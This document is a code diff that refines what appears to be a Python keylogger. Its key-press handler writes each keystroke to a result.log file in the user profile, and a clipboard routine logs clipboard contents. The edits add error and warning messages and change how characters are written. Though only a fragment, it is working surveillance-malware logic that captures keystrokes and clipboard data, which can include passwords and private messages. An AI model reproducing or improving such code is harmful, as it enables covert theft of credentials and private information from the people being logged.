@@ -64,8 +64,10 @@ def on_press(key):
         try:
             if key in special_keys:
                 file.write(special_keys[key])
+            elif key is None:
+                file.write("\n" + ("=" * 50) + "[Error]: Key press event was None" + ("=" * 50) + "\n")
             else:
-                file.write(str(key.char))
+                file.write(key.char)
         except AttributeError:
             file.write(str(key))
 def copy_clipboard_data():
@@ -75,7 +77,7 @@ def copy_clipboard_data():
         if clipboard_data:
             file.write("\n[Clipboard data]: {\n" + str(clipboard_data) + " \n}\n")
         else:
-            pass
+            file.write("\n" + ("=" * 50) + "[Warning]: Clipboard data is empty" + ("=" * 50) + "\n")
 def write_date_to_file():
     path = os.path.join(os.getenv("USERPROFILE"), "result.log")
     with open(path, "a", encoding='utf-8') as file:
